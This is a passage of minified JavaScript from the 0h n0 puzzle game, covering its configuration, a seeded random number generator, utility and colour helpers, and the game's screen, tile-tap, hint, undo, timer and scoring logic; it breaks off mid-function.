var Config={gameID:"0hn0",unlimited:!0,daily:!0,colorTheme:!0,languageSwitch:!0,playLabelPlay:!1,playLabelFree:!0,newLabel:!0,skipGeoIP:!0,GoogleAnalytics:"UA-45298460-7",defaultLanguage:"en",lang:{nl:{tweetMessage:"Ik heb zojuist een $size x $size #0hn0 puzzel opgelost en mijn score is nu $score. http://0hn0.com ",tweetMessageDaily:"Ik heb zojuist de $size x $size #0hn0 puzzel van $today opgelost en mijn score is nu $score. http://0hn0.com "},en:{tweetMessage:"I just completed a $size x $size #0hn0 puzzle and my score is $score. http://0hn0.com ",tweetMessageDaily:"I just completed $today's $size x $size #0hn0 puzzle and my score is $score. http://0hn0.com "}}};!function(e,t){function n(n,m,g){function w(){for(var e=y.g(h),t=d,n=0;e<p;)e=(e+n)*u,t*=u,n=y.g(1);for(;f<=e;)e/=2,t/=2,n>>>=1;return(e+n)/t}var v=[],b=a(function e(t,n){var i,o=[],a=typeof t;if(n&&"object"==a)for(i in t)try{o.push(e(t[i],n-1))}catch(t){}return o.length?o:"string"==a?t:t+"\0"}((m=1==m?{entropy:!0}:m||{}).entropy?[n,r(e)]:null==n?function(){try{var t;return s&&(t=s.randomBytes)?t=t(u):(t=new Uint8Array(u),(l.crypto||l.msCrypto).getRandomValues(t)),r(t)}catch(t){var n=l.navigator,i=n&&n.plugins;return[+new Date,l,i,l.screen,r(e)]}}():n,3),v),y=new i(v);return w.int32=function(){return 0|y.g(4)},w.quick=function(){return y.g(4)/4294967296},w.double=w,a(r(y.S),e),(m.pass||g||function(e,n,i,a){return a&&(a.S&&o(a,y),e.state=function(){return o(y,{})}),i?(t[c]=e,n):e})(w,b,"global"in m?m.global:this==t,m.state)}function i(e){var t,n=e.length,i=this,o=0,a=i.i=i.j=0,r=i.S=[];for(n||(e=[n++]);o<u;)r[o]=o++;for(o=0;o<u;o++)r[o]=r[a=m&a+e[o%n]+(t=r[o])],r[a]=t;(i.g=function(e){for(var t,n=0,o=i.i,a=i.j,r=i.S;e--;)t=r[o=m&o+1],n=n*u+r[m&(r[o]=r[a=m&a+t])+(r[a]=t)];return i.i=o,i.j=a,n})(u)}function o(e,t){return t.i=e.i,t.j=e.j,t.S=e.S.slice(),t}function a(e,t){for(var n,i=e+"",o=0;o<i.length;)t[m&o]=m&(n^=19*t[m&o])+i.charCodeAt(o++);return r(t)}function r(e){return String.fromCharCode.apply(0,e)}var s,l=this,u=256,h=6,c="random",d=t.pow(u,h),p=t.pow(2,52),f=2*p,m=u-1;if(t["seed"+c]=n,a(t.random(),e),"object"==typeof module&&module.exports){module.exports=n;try{s=require("crypto")}catch(e){}}else"function"==typeof define&&define.amd&&define((function(){return n}))}([],Math);var app={fontsLoaded:function(){app.fontsLoaded=!0},deviceReady:!(window.isWebApp=!0),started:!1,initialize:function(){this.bindEvents()},bindEvents:function(){document.addEventListener("deviceready",this.onDeviceReady,!1)},onDeviceReady:function(){setTimeout((function(){navigator&&navigator.splashscreen&&navigator.splashscreen.hide()}),100),app.deviceReady=!0,app.startTheGameIfWeCan(),PlayCenter.autoSignIn()},receivedEvent:function(e){},startTheGameIfWeCan:function(){if(app.started)return!1;app.started=!0,Game.init(),window.Config&&Config.startGame?Config.startGame():Game.start()}};function Utility(){var e,t={isDoubleTapBug:function(e,t){if($.browser.android){if("touchstart"!=e.type&&"touchstart"==$(t).data("lastTouch"))return e.stopImmediatePropagation(),e.preventDefault(),!0;-1!=e.type.indexOf("touch")&&$(t).data("lastTouch",!0)}return!1},getEventNames:function(e){switch(e){case"start":return $.browser.ios||$.browser.android?"touchstart":"touchstart mousedown";case"move":return $.browser.ios||$.browser.android?"touchmove":"touchmove mousemove";case"end":return $.browser.ios||$.browser.android?"touchend":"touchend mouseup";default:return e}},touchEnded:function(){touchEndedSinceTap=!0},isTouch:function(){return"ontouchstart"in document.documentElement},padLeft:function(e,t,n){return Array(t-String(e).length+1).join(n||"0")+e},trim:function(e){return e.replace(/^\s*|\s*$/gi,"")},between:function(e,t,n){return n?+(Math.random()*(t-e)+e).toFixed(n):Math.floor(Math.random()*(t-e+1)+e)},shuffleSimple:function(e){return e.sort((function(){return.5-Math.random()})),e},shuffle:function(e){for(var t=0;t<e.length-1;t++){var n=t+Math.floor(Math.random()*(e.length-t)),i=e[n];e[n]=e[t],e[t]=i}return e},index:function(e,t){var n,i=0;for(n in e){if(i==t)return e[n];i++}},areArraysEqual:function(e,t){return!(!e||!t)&&e.join("|")===t.join("|")},count:function(e){var t,n=0;for(t in e)n++;return n},eat:function(e){return e.preventDefault(),e.stopPropagation(),!1},pick:function(e){var t=e;if(e.constructor==Object)for(var n in t=[],e)t.push(n);var i=Utils.between(0,t.length-1);return 0==t.length?null:t[i]},draw:function(e,t){var n=e;if(e.constructor==Object)for(var i in n=[],e)n.push(i);if(0==n.length)return null;var o=Utils.between(0,n.length-1);if(null!=t){for(var a=!1,r=0;r<n.length;r++)if(n[r]==t){o=r,a=!0;break}if(!a)return null}var s=n[o];return n.splice(o,1),s},removeFromArray:function(e,t){if(0==e.length)return null;for(var n=!1,i=-1,o=0;o<e.length;o++)if(e[o]==t){i=o,n=!0;break}if(!n)return null;var a=e[i];return e.splice(i,1),a},toArray:function(e){var t,n=[];for(t in e)n.push(t);return n},fillArray:function(e,t,n){n=n||1;for(var i=new Array,o=0;o<n;o++)for(var a=e;a<=t;a++)i.push(a);return i},contains:function(e,t){for(var n=0;n<e.length;n++)if(e[n]==t)return!0;return!1},setCookie:function(e,t,n){var i,o;o=n?((i=new Date).setTime(i.getTime()+24*n*60*60*1e3),"; expires="+i.toGMTString()):"",document.cookie=e+"="+t+o+"; path=/"},getCookie:function(e){for(var t=e+"=",n=document.cookie.split(";"),i=0;i<n.length;i++){for(var o=n[i];" "==o.charAt(0);)o=o.substring(1,o.length);if(0==o.indexOf(t))return o.substring(t.length,o.length)}return null},clearCookie:function(e){this.setCookie(e,"",-1)},cssVendor:function(e,t,n){if("opacity"===t)$.browser.ie?e.css("-ms-filter",'"progid:DXImageTransform.Microsoft.Alpha(Opacity='+Math.round(100*n)+')"'):e.css(t,n);else for(var i=["","-webkit-","-moz-","-o-","-ms-"],o=0;o<i.length;o++)e.css(i[o]+t,n)},createCSS:function(e,t){t=t||"tempcss",$("#"+t).remove();var n='<style id="'+t+'">'+e+"</style>";!window.isWebApp&&window.MSApp&&window.MSApp.execUnsafeLocalFunction?MSApp.execUnsafeLocalFunction((function(){$("head").first().append($(n))})):$("head").first().append($(n))},setColorScheme:function(e,t){t=t||Colors.getComplementary(e);var n=(Colors.luminateHex(e,.05),Colors.luminateHex(t,.05),".odd  .tile-1 .inner { background-color: "+e+"; }.even .tile-1 .inner { background-color: "+e+"; }.odd  .tile-2 .inner { background-color: "+t+"; }.even .tile-2 .inner { background-color: "+t+"; }");Utils.createCSS(n)}};for(e in t)this[e]=t[e]}app.initialize();var o,Utils=new Utility,Colors=new function(){function e(e){var t=/^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(e);return t?{r:parseInt(t[1],16),g:parseInt(t[2],16),b:parseInt(t[3],16)}:null}function n(e){var t=e.toString(16);return 1==t.length?"0"+t:t}function o(e,t,i){return"object"==typeof e&&(t=e.g,i=e.b,e=e.r),"#"+n(e)+n(t)+n(i)}function a(e){var t,n,i,o,a,r;return hsv=new Object,max=(t=e.r,n=e.g,i=e.b,n<t?i<t?t:i:i<n?n:i),dif=max-(o=e.r,a=e.g,r=e.b,o<a?o<r?o:r:a<r?a:r),hsv.saturation=0==max?0:100*dif/max,0==hsv.saturation?hsv.hue=0:e.r==max?hsv.hue=60*(e.g-e.b)/dif:e.g==max?hsv.hue=120+60*(e.b-e.r)/dif:e.b==max&&(hsv.hue=240+60*(e.r-e.g)/dif),hsv.hue<0&&(hsv.hue+=360),hsv.value=Math.round(100*max/255),hsv.hue=Math.round(hsv.hue),hsv.saturation=Math.round(hsv.saturation),hsv}function r(e){var n=new Object;if(0==e.saturation)n.r=n.g=n.b=Math.round(2.55*e.value);else{switch(e.hue/=60,e.saturation/=100,e.value/=100,i=Math.floor(e.hue),f=e.hue-i,p=e.value*(1-e.saturation),q=e.value*(1-e.saturation*f),t=e.value*(1-e.saturation*(1-f)),i){case 0:n.r=e.value,n.g=t,n.b=p;break;case 1:n.r=q,n.g=e.value,n.b=p;break;case 2:n.r=p,n.g=e.value,n.b=t;break;case 3:n.r=p,n.g=q,n.b=e.value;break;case 4:n.r=t,n.g=p,n.b=e.value;break;default:n.r=e.value,n.g=p,n.b=q}n.r=Math.round(255*n.r),n.g=Math.round(255*n.g),n.b=Math.round(255*n.b)}return n}this.hexToRgb=e,this.componentToHex=n,this.rgbToHex=o,this.colorToRgb=function(t){return isNaN(t)||(t=PALETTE[t]),e(t)},this.colorsMatch=function(e,t){return e.r==t.r&&e.g==t.g&&e.b==t.b},this.getComplementary=function(t){var n="string"==typeof t;n&&(t=e(t));var i=a(t);i.hue=function(e,t){for(e+=180;360<=e;)e-=360;for(;e<0;)e+=360;return e}(i.hue);var s=r(i);return n&&(s=o(s)),s},this.rgbToHsv=a,this.hsvToRgb=r,this.luminateHex=function(e,t){(e=String(e).replace(/[^0-9a-f]/gi,"")).length<6&&(e=e[0]+e[0]+e[1]+e[1]+e[2]+e[2]),t=t||0;for(var n,i="#",o=0;o<3;o++)n=parseInt(e.substr(2*o,2),16),i+=("00"+(n=Math.round(Math.min(Math.max(0,n+n*t),255)).toString(16))).substr(n.length);return i}};for(o in window.$=window.$||{},$.browser={},$.browser.chrome=/chrome/.test(navigator.userAgent.toLowerCase()),$.browser.android=/android/.test(navigator.userAgent.toLowerCase()),$.browser.safari=/safari/.test(navigator.userAgent.toLowerCase()),$.browser.ipad=/ipad/.test(navigator.userAgent.toLowerCase()),$.browser.iphone=/iphone|ipod/.test(navigator.userAgent.toLowerCase()),$.browser.ios=/ipad|iphone|ipod/.test(navigator.userAgent.toLowerCase()),$.browser.ie=/msie/.test(navigator.userAgent.toLowerCase()),$.browser.chromeWebStore=!(!window.chrome||!window.chrome.storage),$.browser)$.browser[o]&&$("html").addClass(o);function opposite(e){switch(e){case Directions.Right:return Directions.Left;case Directions.Left:return Directions.Right;case Directions.Up:return Directions.Down;case Directions.Down:return Directions.Up}return null}function generateUUID(){var e=(new Date).getTime();return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,(function(t){var n=(e+16*Math.random())%16|0;return e=Math.floor(e/16),("x"==t?n:3&n|8).toString(16)}))}window.requestAnimFrame=window.requestAnimationFrame||window.webkitRequestAnimationFrame||window.mozRequestAnimationFrame||window.oRequestAnimationFrame||window.msRequestAnimationFrame||function(e,t){window.setTimeout((function(){e(+new Date)}),10)},window.cancelAnimFrame=window.cancelAnimationFrame||window.webkitCancelRequestAnimationFrame||window.mozCancelRequestAnimationFrame||window.oCancelRequestAnimationFrame||window.msCancelRequestAnimationFrame||function(){};var HintType={None:"None",NumberCanBeEntered:"NumberCanBeEntered",OneDirectionLeft:"OneDirectionLeft",ValueReached:"ValueReached",WouldExceed:"WouldExceed",OneDirectionRequired:"OneDirectionRequired",MustBeWall:"MustBeWall",ErrorClosedTooEarly:"ErrorClosedTooEarly",ErrorClosedTooLate:"ErrorClosedTooLate",Error:"Error",Errors:"Errors",LockedIn:"LockedIn",GameContinued:"GameContinued",TimeTrialShown:"TimeTrialShown"},TileType={Unknown:"Unknown",Dot:"Dot",Wall:"Wall",Value:"Value"},Directions={Left:"Left",Right:"Right",Up:"Up",Down:"Down"},Game=new function(){var e,t,n,i,o,a,r=void 0,s=Config.debugForcedSize||0,l=0,u="#debug"==document.location.hash,h=window.isWebApp,c=!1,d=window.isWebApp,p=!1,f=!1,m=!1,g=!1,w=!1,v=!!u,b=!0,y=0,k=!1,T=[4,5,6,7,8,9,10,11,12],C=0,S=null,x=0,_=[],z=!0,D=[],A=!1,P=!1,M=!1,I=!0,L=!1,G=!1,U=0,N="",E=0,V=0,j=0,W=0,O=0,q="#0hn0 It's 0h h1's companion! Go get addicted to this lovely puzzle game https://0hn0.com (or get the app)!";function R(){$(".tile").css({width:"auto",height:"auto"});var e,t={iphone4:{width:320,height:480},iphone5:{width:320,height:568},nexus5:{width:360,height:640},nexus7:{width:604,height:966},oneplus6:{width:270,height:570},s9:{width:360,height:740},pocophone:{width:1080,height:2246}};for(e in t)t[e].id=e;var n,i={width:$("#feelsize").width(),height:$("#feelsize").height()},o=i.width/i.height,a=t.iphone4,r=999;for(n in t){var s=t[n],l=s.width/s.height,u=Math.abs(o-l);u<r&&(a=t[n],r=u)}var h,c=i.width/i.height<o,d={width:Math.floor(c?i.width:i.height/a.height*a.width),height:Math.floor(c?i.width/a.width*a.height:i.height)};d.width>i.width&&(h=Math.floor(i.width/d.width*100)/100,d.width*=h),d.width==i.width&&(h=.96,d.width*=h),$("#container").css({width:d.width+"px",height:d.height+"px"});var p=d.width;$("h1").css("font-size",Math.round(.24*p)+"px"),$("h2").css("font-size",Math.round(.18*p)+"px"),$("h3").css("font-size",Math.round(.15*p)+"px"),$("p").css("font-size",Math.round(.07*p)+"px"),$(".by").css("font-size",Math.round(.05*p)+"px"),$("#menu h2").css("font-size",Math.round(.24*p)+"px"),$("#menu p").css("font-size",Math.round(.1*p)+"px"),$("#menu p").css("padding",Math.round(.05*p)+"px 0"),$("#menu p").css("line-height",Math.round(.08*p)+"px"),$("#menu p .multiline").css("line-height",Math.round(.12*p)+"px"),$("#hiddendigit, #timer .digit, #percentage").css("font-size",Math.round(.05*p)+"px");var f=Math.round(.1*p);$("#score").css({"font-size":f+"px","line-height":.85*f+"px",height:f+"px"});var m=Math.floor(.075*p);$(".icon").css({width:m,height:m,marginLeft:.7*m,marginRight:.7*m}),$(".board table").each((function(e,t){var n,i,o=$(t),a=o.attr("data-grid"),r=o.width(),s=o.find("tr").first().children("td").length,l=Math.floor(r/s);l&&(o.find(".tile").css({width:l,height:l,"line-height":Math.round(.9*l)+"px","font-size":Math.round(.5*l)+"px"}),i="#"+a+" .tile .inner { border-radius: "+(n=Math.round(+l))+"px; }#"+a+" .tile-1 .inner:after, #"+a+" .tile-2 .inner:after { border-radius: "+n+"px; }",Utils.createCSS(i,a+"radius"))})),$("#digits").width($("#titlegrid table").width()).height($("#titlegrid table").height()),$("#digits").css({"line-height":Math.round(.92*$("#titlegrid table").height())+"px","font-size":.5*$("#titlegrid table").height()+"px"});var g=Math.floor($("#container").height()/2-$("#board").height()/2);$("#hintMsg").height(g+"px"),$(".digit").css("width",$("#hiddendigit").width()+"px"),window.Themes&&Themes.resize(d.width,d.height)}function B(){z=!0,$(".screen").hide().removeClass("show"),$("#title").show(),setTimeout((function(){$("#title").addClass("show")}),0)}function H(){z=!1,$(".screen").hide().removeClass("show"),$("#game").show(),$("#game #time").show(),setTimeout((function(){$("#game").addClass("show")}),0),R(),S&&!S.isTutorial&&($("#bar [data-action]").show(),$('#bar [data-action="playcenter"]').hide(),$('#bar [data-action="continue"]').hide(),$('#bar [data-action="achievements"]').hide(),$('#bar [data-action="leaderboards"]').hide(),$('#tweeturl, #facebook, [data-action="apps"]').hide())}function F(){if(Config.skipMenu)return ue("play-daily");z=!(M=P=!1),we(),clearTimeout(a),$("#playcenter").removeClass("spin"),$(".screen").hide().removeClass("show"),$("#menu").show(),$("#bar").show(),$("#bar [data-action]").hide(),PlayCenter.enabled&&$('#bar [data-action="playcenter"]').show(),fe((function(e){$("#scorenr").html(e)})),setTimeout((function(){$("#menu").addClass("show")}),0),R()}function J(){M=!(z=!1),$(".screen").hide().removeClass("show"),$("#about").show(),$("#bar [data-action]").hide(),setTimeout((function(){$("#about").addClass("show")}),0),R(),window.Marker&&Marker.save("page","about")}function K(){M=!(z=!1),$(".screen").hide().removeClass("show"),$("#online").show(),$("#bar [data-action]").hide(),$('#bar [data-action="back"]').show(),setTimeout((function(){$("#online").addClass("show")}),0),R(),window.Marker&&Marker.save("page","online")}function Q(){M=!(z=!1),$(".screen").hide().removeClass("show"),$("#thanks").show(),setTimeout((function(){$("#thanks").addClass("show")}),0),R(),window.Marker&&Marker.save("page","thanks")}function Y(){M=!(z=!1),$(".screen").hide().removeClass("show"),$("#apps").show(),setTimeout((function(){$("#apps").addClass("show")}),0),R(),window.Marker&&Marker.save("page","apps")}function X(){M=!(z=!1),$(".screen").hide().removeClass("show"),$("#settings").show(),$("#settings [data-action]").show(),setTimeout((function(){$("#settings").addClass("show")}),0),R(),window.Marker&&Marker.save("page","settings")}function Z(){if(s)return ee(s),0;Config.skipMenu&&$('[data-action="back"]').hide(),M=z=!1,$("#donate").hide(),H(),m?($("#boardsize").html("<span>"+xe()+"</span>"),$("#chooseSize").addClass("show")):(window.Config||{}).playLabelFree?($("#boardsize").html("<span>"+Language.get("Free play")+"</span>"),$("#chooseSize").addClass("show")):$("#boardsize").html("<span>"+Language.get("Select a size")+"</span>"),Ae(),$(".menugrid").removeClass("hidden"),$("#board").addClass("hidden"),$("#bar [data-action]").hide(),Config.skipMenu||$('#bar [data-action="back"]').show(),PlayCenter.isSignedIn&&$('[data-action="achievements"],[data-action="leaderboards"]').show(),L&&!S.isTutorial&&$('[data-action="continue"]').show().addClass("subtleHintOnce"),$("#board").addClass("hidden"),$("#score").show(),$("#time").hide(),setTimeout((function(){e&&e.clear(),$("#score").addClass("show")}),0)}function ee(e){z=!1,$("#game").removeClass("show"),z=!1,$(".screen").hide().removeClass("show"),$("#loading").show(),setTimeout((function(){$("#loading").addClass("show")}),0),R(),setTimeout((function(){var t;m?(t=(Config.seedPrefix||"")+De()+"-"+i,Math.seedrandom(t)):Math.seedrandom();var n=!!m,i=Levels.getSize(e,n);te(i)}),100)}function te(t,n){if(isNaN(t)){if(z=!1,!t||!t.size||!t.full)throw"no proper puzzle object received";u&&console.log(t),we(),window.STOPPED||(w=!1,$("#undo").closest(".iconcon").css("display","inline-block"),$(".menugrid").addClass("hidden"),$("#board").removeClass("hidden"),$("#chooseSize").removeClass("show"),$("#score").removeClass("show").hide(),$('#bar [data-action="help"]').removeClass("hidden wiggle"),$('#bar [data-action="help"]').removeClass("subtleHint").css("display","inline-block"),$("#boardsize").html("<span>"+t.size+" x "+t.size+"</span>"),e=new Grid(t.size,t.size),C=t.size,M=!(P=L=!0),systemTilesLockToggleable=!(O=W=j=V=0),e.load(t),e.each((function(){this.value=this.value,(this.isWall()||this.isNumber())&&(this.system=!0)})),S=t,e.hint.active=!0,e.activateDomRenderer(),e.render(),I=A=!(D=[]),t.isTutorial||window.Marker&&Marker.save("level","start",t.size),n||(U=new Date),t.isTutorial?$("#game").addClass("isTutorial"):$("#game").removeClass("isTutorial"),clearTimeout(E),ie(t.size),oe(),Se(!0),p&&!t.isTutorial?ne(!0,!0):ne(!1,!0),setTimeout((function(){H()}),0))}else ee(t)}function ne(t,n){var i;p=null!=t?t:!p,n||Storage.setDataValue("showTimeTrial",p),p?($("#time").removeClass("hidden"),n||$("#toggleTimeTrialValue text").text(Language.get("Yes")),P&&($("#time").show(),i=ie(S.size),null==t&&e.hint.show(HintType.TimeTrialShown,i))):($("#time").addClass("hidden"),n||$("#toggleTimeTrialValue text").text(Language.get("No")),P&&($("#time").hide(),null==t&&e.hint.hide(),$("#boardsize").html("<span>"+S.size+" x "+S.size+"</span>")))}function ie(e){var t=Storage.getDataValue("bestTimeSize"+e,60*e);if(!t||0===t||60*e<t)return!1;var n=1e3*t,i=parseInt(n/1e3%60),o=parseInt(n/6e4%60),a=parseInt(n/36e5%24),r="";return 0<a&&(r=r+a+":"),r=r+(o=0<a&&o<10?"0"+o:o)+":",r+=i=i<10?"0"+i:i,$("#boardsize span").text(r),r}function oe(){var e=new Date-U,t=parseInt(e/1e3%60),n=parseInt(e/6e4%60),i=parseInt(e/36e5%24);V=parseInt(e/1e3),n=n<10?"0"+n:n,t=t<10?"0"+t:t,N="",0<i&&(N=N+i+":"),N=N+(n+="")+":",N+=t+="",$("#minutes-l").text(n.split("")[0]),$("#minutes-r").text(n.split("")[1]),$("#seconds-l").text(t.split("")[0]),$("#seconds-r").text(t.split("")[1]),I||(E=setTimeout(oe,1e3))}function ae(){clearTimeout(E),fe((function(o){var a,r,l=!1;m&&((a=Storage.getDataValue("today-progress",{}))[r=S.size-3]?l=!0:(Storage.setDataValue("today-progress",a),a[r]=!0,Storage.setDataValue("today-progress",a)),Ae());var u=+o,p=u;0==l&&(p=me(e.width*e.height,o)),$("#scorenr").html(p),L=!1,e.unmark(),e.hint.hide(),e.hint.active=!1,Tutorial.end(),systemTilesLockToggleable=!1;var f=function(){var e=Language.get("ojoos");return _.length||(_=Utils.shuffle(e.slice(0))),Utils.draw(_)}()+"!";$("#boardsize").html("<span>"+f+"</span>"),e.each((function(){this.system=!0})),$("#bar [data-action]").hide(),e.solve(),e.render(),$("#donate").hide(),0==Storage.getDataValue("donated",!1)&&5<=Storage.getDataValue("gamesPlayed",0)&&$("#donate").show(),Storage.levelCompleted(S.size,p,V,S.isTutorial,j,W),i=setTimeout((function(){$("#grid").addClass("completed"),t=setTimeout((function(){$("#board").addClass("hidden"),n=setTimeout((function(){if(P=!(I=!0),s&&!S.isTutorial)return Config.completeGame?Config.completeGame({puzzle:S,score:p}):ee(s);var e,t,n,i;if($(".menugrid").removeClass("hidden"),$("#chooseSize").addClass("show"),$("#score").show(),0==Storage.getDataValue("donated",!1)&&5<=Storage.getDataValue("gamesPlayed",0)&&$("#donate").show(),PlayCenter.isSignedIn&&$('[data-action="achievements"],[data-action="leaderboards"]').show(),w?window.Marker&&Marker.save("tutorial","completed"):(window.Marker&&Marker.save("level","completed",S.size),window.Marker&&Marker.save("score",p),u<p&&(i=500/((n=p)-(t=u)),function e(){$("#scorenr").html(t),t<n&&t++,me.TOH=setTimeout(e,i)}(),d&&$('[data-action="apps"]').show(),h&&!S.isTutorial&&(e=S.size,fe((function(t){var n=m?"tweetMessageDaily":"tweetMessage",i=Language.get(n);window.Config&&Config.lang&&Config.lang[Language.current]&&(i=Config.lang[Language.current][n]),i=(i=(i=i.replace(/\$size/gi,e)).replace(/\$score/gi,t)).replace(/\$today/gi,xe().toLowerCase());var o="https://twitter.com/intent/tweet?text="+encodeURIComponent(i);q=i,$("#tweeturl").attr("href",o)})),$("#tweeturl").show()),c&&!S.isTutorial&&$("#facebook").show())),S.isTutorial){var o=m?xe():Language.get("Select a size");if($("#boardsize").html("<span>"+o+"</span>"),s)return ee(s)}Config.skipMenu||$('#bar [data-action="back"]').show(),$("#time").hide(),setTimeout((function(){$("#score").addClass("show"),$("#grid").removeClass("completed"),setTimeout((function(){$("#tweeturl").addClass("subtleHintOnce")}),1e3)}),0)}),50)}),2e3)}),2e3),S.isTutorial||Levels.finishedSize(e.width)}))}function re(){Storage.gameQuitted(),I=!(P=!1),we(),clearTimeout(E),$("#time").hide(),e&&(e.unmark(),e.hint.hide(),e.hint.active=!1,e.each((function(){this.system=!0}))),Z()}function se(t){if(window.Utils&&Utils.isDoubleTapBug(t))return!1;var n=$(t.target).closest("td"),i=+n.attr("data-x"),o=+n.attr("data-y"),a=e.tile(i,o),r=3===t.which;if(Tutorial.active&&Tutorial.nextAllowed())return Tutorial.next(),!1;if(a.system){var s=n.find(".tile");return s.addClass("error"),G?($(".system").removeClass("system"),G=!1):S.isTutorial||systemTilesLockToggleable&&(e.each((function(e,t,n,i){var o;this.system&&(o=$("#tile-"+e+"-"+t),this.isWall()&&o.addClass("system"))})),G=!0,10==++O&&PlayCenter.unlockAchievement(PlayCenter.IDS.Achievements.happy_lock_toggler)),setTimeout((function(){s.removeClass("error")}),500),!1}if(clearTimeout(x),Tutorial.active)return Tutorial.tapTile(a),Tutorial.active||(x=setTimeout((function(){he()}),700)),!1;e&&e.hint&&e.hint.clear();var l,u,h,c={x:a.x,y:a.y,oldValue:a.getExportValue(),time:new Date};return D.length?(l=D[D.length-1],u=e.tile(l.x,l.y),h=l.time,(u.id!=a.id||500<new Date-h)&&D.push(c)):D.push(c),r?a.isUnknown()?a.wall():a.isWall()?a.dot():a.clear():a.isUnknown()?a.dot():a.isDot()?a.wall():a.clear(),D.length&&((l=D[D.length-1]).newValue=a.getExportValue()),Se(),x=setTimeout((function(){he()}),700),!1}function le(e){if(window.Utils&&Utils.isDoubleTapBug(e))return!1;var t=$(e.target).closest("*[data-action]"),n=$(e.target).closest("*[data-action]").attr("data-action"),i=(t.attr("data-value"),!(!t||!t.length||"A"!=t[0].nodeName));if(!i&&e.target&&"A"==e.target.nodeName&&(i=!0),n&&!i)return ue(n),!1;if(i&&!window.isWebApp){if($(e.target).closest('[data-link="social"]').length)return;e.preventDefault();var o=$(e.target).attr("href");return $.browser.android,window.open(o,"_system"),!1}}function ue(t){switch(t){case"toggleHintIcon":g=!g,Storage.setDataValue("hideHintIcon",g),$e();break;case"games":Ce();break;case"duomoji":window.open("https://duomoji.com/?utm_source=0hn0");break;case"promo":Promo.click();break;case"close-titleScreen":!function(){if(!k&&!Storage.getDataValue("splashSkibbable",!1)){if(++y<8)return;Storage.setDataValue("splashSkibbable",!0),PlayCenter.unlockAchievement(PlayCenter.IDS.Achievements.the_impatient_one)}ce(F)}();break;case"show-menu":clearTimeout(x),Tutorial.end(),e&&e.hint.clear(),F(),I=!0;break;case"back":return P&&M?ue("show-game"):!P&&M?ue("show-menu"):P&&S&&S.isTutorial?(Tutorial.end(),re(),clearTimeout(x),ue("show-menu")):P&&S&&!S.isTutorial?(clearTimeout(x),s&&Config.abortGame?void fe((function(e){Config.abortGame({score:+e||0})})):(re(),ue("show-sizes"))):Config.skipMenu?Config.abortGame?void fe((function(e){Config.abortGame({score:+e||0})})):ue("show-daily"):ue("show-menu");case"next":clearTimeout(x),Tutorial.end(),e&&e.hint.clear(),ee(C);break;case"undo":I||(window.Marker&&Marker.save("button","undo",S?S.size:void 0),ge());break;case"continue":if(Tutorial.active)return Tutorial.next();n=JSON.parse(JSON.stringify(D)),te(S,!0),$(n).each((function(){e.tile(this.x,this.y).setExportValue(this.newValue)})),D=n,setTimeout((function(){e.hint.show(HintType.GameContinued)}),0),window.Marker&&Marker.save("button","continue",S?S.size:void 0);break;case"retry":break;case"help":if(I)break;if(clearTimeout(x),Tutorial.active&&!Tutorial.hintAllowed())return;e.hint.visible?e.hint.clear():(e.hint.clear(),e.hint.next(),j++,window.Marker&&Marker.save("button","hint",S?S.size:void 0));break;case"in-game-about":P=!0,J();break;case"rules":M=!(z=!1),$(".screen").hide().removeClass("show"),$("#rules").show(),setTimeout((function(){$("#rules").addClass("show")}),0),R(),window.Marker&&Marker.save("page","rules");break;case"thanks":Q();break;case"show-0hh1":Ce();break;case"apps":if(!d)return ue("show-0hh1");Y();break;case"show-game":M=!1,H();break;case"play":m=!1,(v?Z:de)();break;case"play-daily":m=!0,(v?Z:de)();break;case"tutorial":!Config.unlimited&&Config.daily&&(m=!0),de();break;case"about":J();break;case"achievements":PlayCenter.showAchievements();break;case"leaderboards":PlayCenter.showLeaderboard();break;case"playcenter":$.browser.ios&&!window.isWebApp&&PlayCenter.enabled&&!PlayCenter.isSignedIn?($("#playcenter").addClass("spin"),PlayCenter.signIn(),clearTimeout(a),a=setTimeout((function(){$("#playcenter").removeClass("spin")}),4e3)):K();break;case"sign-out":PlayCenter.signOut();break;case"sign-in":PlayCenter.signIn();break;case"stopwatch":case"settings":X();break;case"color-theme":theme=Storage.getDataValue("theme",1),theme++,3<theme&&(theme=1),ve(theme);break;case"toggleTimeTrial":ne();break;case"toggleDonate":Storage.getDataValue("donated",!1)||(u?confirm("Purchase 0h h1 for a $?")&&be():Store.buyFullVersion());break;case"afterThanks":if(!b)return b=!0,void F();J();break;case"contranoid":Te();break;case"toggleLanguage":Language.toggle(),ze()}var n}function he(){0<e.emptyTileCount?e.isValid()?$('#bar [data-action="help"]').removeClass("subtleHint"):($('#bar [data-action="help"]').removeClass("subtleHint"),clearTimeout(o),setTimeout((function(){e.getClosedWrongTiles().length&&($('#bar [data-action="help"]').addClass("subtleHint"),o=setTimeout((function(){$('#bar [data-action="help"]').removeClass("subtleHint")}),2e3))}),0)):e.isValid()?ae():e.hint.next()}function ce(e){Storage.getItem("tutorialPlayed",(function(t){var n=t.tutorialPlayed+""=="true";e(v=n)}))}function de(){$("#bar [data-action]").hide(),z=!1,Tutorial.start(),w=!0,ce((function(e){e||(w=!1),Storage.setItem("tutorialPlayed",!0),v=!0,$("#undo").closest(".iconcon").css("display","none")}))}function pe(){return z?window.WinJS?window.close():navigator.app&&navigator.app.exitApp():ue("back"),!0}function fe(e){Storage.getItem("score",(function(t){var n=t.score;e(n=n||0)}))}function me(e,t){clearTimeout(me.TOH);var n=score=+t,i=n+(e||0);return i<=n?n:(Storage.setItem("score",i),i)}function ge(){if(!D.length)return e.hint.visible?(e.unmark(),void e.hint.hide()):void(A?e.hint.show("Nothing to undo."):e.hint.show("That's the undo button."));var t=D.pop(),n=e.tile(t.x,t.y),i=t.oldValue;e.unmark(),0<=i?n.setExportValue(i):n.clear(),n.mark();var o=Language.get("This tile was reversed to ");1==i&&(o+=Language.get("red.")),2==i&&(o+=Language.get("blue.")),0==i&&(o+=Language.get("its empty state.")),e.hint.show(o),A=!0,W++,Se(),clearTimeout(x),x=setTimeout((function(){he()}),700)}function we(){clearTimeout(t),clearTimeout(n),clearTimeout(i),clearTimeout(o)}function ve(e){$("html").removeClass("theme1 theme2 theme3").addClass("theme"+e),Storage.setDataValue("theme",e),window.Themes&&Themes.apply(e)}function be(){ye(),b=!1,Q()}function 